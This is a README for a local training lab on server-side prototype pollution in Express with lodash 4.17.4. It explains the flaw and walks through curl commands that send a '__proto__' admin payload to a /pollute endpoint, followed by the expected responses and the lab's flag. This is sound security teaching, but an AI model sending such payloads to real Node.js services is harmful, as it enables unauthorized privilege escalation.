# Prototype Pollution Lab

## Overview

Practice exploiting Server-Side Prototype Pollution (SSPP) vulnerabilities in modern JavaScript/Node.js web runtimes (PortSwigger Web Security Academy topic 25).

This lab demonstrates an insecure recursive deep merge vulnerability using Express and Lodash (`lodash@4.17.4`), vulnerable to **CVE-2018-3721** and **CVE-2019-10744**.

- **Default Port / Access**: `http://localhost:8096`
- **Shortcut**: `./lab start prototype-pollution`

---

## Sources of Truth & Vulnerability Advisories

- **PortSwigger Web Security Academy**: [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- **CVE-2018-3721**: Prototype pollution vulnerability in lodash prior to 4.17.5 via `defaultsDeep` and `merge`.
- **CVE-2019-10744**: Prototype pollution in lodash prior to 4.17.12 allowing attackers to inject properties onto `Object.prototype` via `merge`, `mergeWith`, and `defaultsDeep`.

---

## Vulnerability Mechanism: `Object.prototype` Pollution via `__proto__`

In JavaScript, objects inherit properties and methods from their prototype chain up to `Object.prototype`. When an application recursively merges user-supplied JSON input into a target object without sanitizing special object keys such as `__proto__` or `constructor.prototype`, an attacker can inject properties directly into the base prototype:

```json
{
  "__proto__": {
    "admin": true
  }
}
```

When Lodash `_.merge({}, payload)` processes the nested `__proto__` key, it modifies `Object.prototype`. Because virtually all JavaScript objects in the Node.js runtime inherit from `Object.prototype`, any subsequent check on an uninitialized property (such as `config.admin`) resolves to `true`, resulting in privilege escalation and exposure of the root flag.

---

## Exploitation Workflow

1. **Verify Baseline Access (Access Denied)**:
   Access `http://localhost:8096/` or query via curl:

   ```bash
   curl -s http://localhost:8096/
   ```

   **Expected Response**:

   ```html
   <h1>Prototype Pollution Target</h1>
   <p>Status: Running</p>
   <p>Admin Flag: ACCESS_DENIED</p>
   ```

2. **Pollute `Object.prototype` via `__proto__`**:
   Submit a JSON payload to `/pollute` (or `/api/update`) to inject the `admin` property onto `Object.prototype`:

   ```bash
   curl -s -X POST http://localhost:8096/pollute \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"admin": true}}'
   ```

   **Expected Response**:

   ```json
   { "status": "processed", "admin": true }
   ```

3. **Verify Pollution & Privilege Escalation (Flag Retrieval)**:
   Re-query the root endpoint:
   ```bash
   curl -s http://localhost:8096/
   ```
   **Expected Response**:
   ```html
   <h1>Prototype Pollution Target</h1>
   <p>Status: Running</p>
   <p>Admin Flag: FLAG{PROTO_POLLUTED_ROOT}</p>
   ```

---

## YouTube Walkthroughs & Solving Guides

- [The Cyber Terminal - Exploiting Prototype Pollution in JavaScript for Server-Side RCE](https://www.youtube.com/watch?v=9UAQ1VzSq8Q)
- [Pink Boo - Detecting Server-Side Prototype Pollution (PortSwigger Academy)](https://www.youtube.com/watch?v=0KYDTt5DiNM)
- [CyberSecurityTV - Prototype Pollution Attack Explained](https://www.youtube.com/watch?v=__65_GFERKs)
